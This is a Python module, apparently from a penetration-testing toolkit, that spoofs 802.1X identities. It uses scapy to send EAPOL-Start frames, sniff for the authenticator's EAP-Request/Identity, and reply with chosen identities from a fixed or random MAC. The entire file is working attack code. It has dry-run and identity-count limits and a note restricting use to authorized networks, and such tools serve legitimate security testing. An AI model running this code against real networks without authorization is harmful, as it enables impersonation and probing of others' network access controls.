"""802.1X identity spoofing: claim another identity in an EAP exchange, from the operator's MAC.

An 802.1X authenticator asks the supplicant for its identity (EAP-Request/Identity) and passes
the identity it receives to the authentication server, before any proof is checked. A device
that starts a session and answers the identity request with a name that is not its own gets
that name into the authentication server's request.

This module sends EAPOL-Start from the operator's MAC, waits for the authenticator's
EAP-Request/Identity, and answers with an EAP-Response/Identity carrying each identity the
operator gives. It does not send any proof of identity (no password, no certificate), and it
does not complete an EAP method.

The effect to measure is whether the authenticator forwards each claimed identity to the
authentication server, and what the server decides for it.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import AsyncSniffer, Ether, sendp
from scapy.layers.eap import EAP, EAPOL
from scapy.packet import Packet, Raw

from macabre.attacks.common import normalize_unicast_mac, random_mac
from macabre.attacks.eapol_start_flooding import build_start

EAP_REQUEST = 1
EAP_RESPONSE = 2
EAP_TYPE_IDENTITY = 1
ETHERTYPE_EAPOL = 0x888E
PAE_GROUP_MAC = "01:80:c2:00:00:03"
MAX_IDENTITIES = 20
MAX_IDENTITY_LENGTH = 64
MAX_TIMEOUT_SECONDS = 10.0


@dataclass(frozen=True)
class EapolIdentitySpoofingConfig:
    iface: str                          # attacker interface, on the segment with the authenticator
    identities: tuple[str, ...]         # identities to claim, one exchange each
    source_mac: str = ""                # MAC for every exchange; empty = a random MAC for each exchange
    response_timeout: float = 3.0       # seconds to wait for the identity request
    dry_run: bool = False               # build frames but do not send them

    def __post_init__(self) -> None:
        if self.source_mac:
            normalize_unicast_mac(self.source_mac)
        if not self.identities:
            raise ValueError("At least one identity is required.")
        if len(self.identities) > MAX_IDENTITIES:
            raise ValueError(f"At most {MAX_IDENTITIES} identities per run.")
        for identity in self.identities:
            if not identity or len(identity.encode()) > MAX_IDENTITY_LENGTH:
                raise ValueError(f"Identities must be 1 to {MAX_IDENTITY_LENGTH} bytes long.")
        if not 0 < self.response_timeout <= MAX_TIMEOUT_SECONDS:
            raise ValueError(f"Response timeout must be between 0 and {MAX_TIMEOUT_SECONDS:g} seconds.")


@dataclass
class EapolIdentitySpoofingStats:
    exchanges: int = 0
    requests_seen: int = 0
    responses: int = 0
    status: str = ""


def build_identity_response(source_mac: str, identifier: int, identity: str) -> Packet:
    """An EAP-Response/Identity from `source_mac`, answering a request with `identifier`, carrying `identity`."""
    return (
        Ether(src=normalize_unicast_mac(source_mac), dst=PAE_GROUP_MAC, type=ETHERTYPE_EAPOL)
        / EAPOL(version=2, type=0)
        / EAP(code=EAP_RESPONSE, id=identifier, type=EAP_TYPE_IDENTITY)
        / Raw(load=identity.encode())
    )


def is_identity_request(packet: Packet, source_mac: str) -> bool:
    """True for an EAP-Request/Identity addressed to `source_mac`."""
    return (
        packet.haslayer(EAP)
        and packet.haslayer(Ether)
        and packet[Ether].dst.lower() == source_mac.lower()
        and packet[EAP].code == EAP_REQUEST
        and packet[EAP].type == EAP_TYPE_IDENTITY
    )


def wait_for_identity_request(iface: str, source_mac: str, timeout: float) -> int | None:
    """Return the identifier of the first EAP-Request/Identity to `source_mac`, or None on timeout."""
    found: list[int] = []
    sniffer = AsyncSniffer(
        iface=iface,
        promisc=True,
        lfilter=lambda p: is_identity_request(p, source_mac),
        prn=lambda p: found.append(p[EAP].id),
        store=False,
    )
    sniffer.start()
    deadline = time.monotonic() + timeout
    while not found and time.monotonic() < deadline:
        time.sleep(0.05)
    sniffer.stop()
    return found[0] if found else None


def run_eapol_identity_spoofing(
    config: EapolIdentitySpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[EapolIdentitySpoofingStats], None],
    rng: random.Random | None = None,
    wait: Callable[..., int | None] | None = None,
    send: Callable[..., Any] | None = None,
) -> EapolIdentitySpoofingStats:
    """For each identity: send EAPOL-Start, wait for the identity request, answer with the identity."""
    rng = rng or random.Random()
    wait = wait or wait_for_identity_request
    send = send or sendp

    if config.dry_run:
        origin = config.source_mac or "a random MAC for each exchange"
        stats = EapolIdentitySpoofingStats(
            status=(
                f"Dry run: would start {len(config.identities)} exchange(s) from {origin} and claim "
                f"{', '.join(config.identities)}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = EapolIdentitySpoofingStats()
    for identity in config.identities:
        if stop_event.is_set():
            break
        stats.exchanges += 1
        source = config.source_mac or random_mac(rng)
        result: dict[str, int | None] = {}
        start_frame = build_start(source)

        def exchange() -> None:
            result["identifier"] = wait(config.iface, source, config.response_timeout)

        worker = threading.Thread(target=exchange, daemon=True)
        worker.start()
        time.sleep(0.2)
        send(start_frame, iface=config.iface, verbose=False)
        worker.join(config.response_timeout + 1.0)
        identifier = result.get("identifier")
        if identifier is not None:
            stats.requests_seen += 1
            send(build_identity_response(source, identifier, identity), iface=config.iface, verbose=False)
            stats.responses += 1
        on_progress(replace(stats))
    return stats
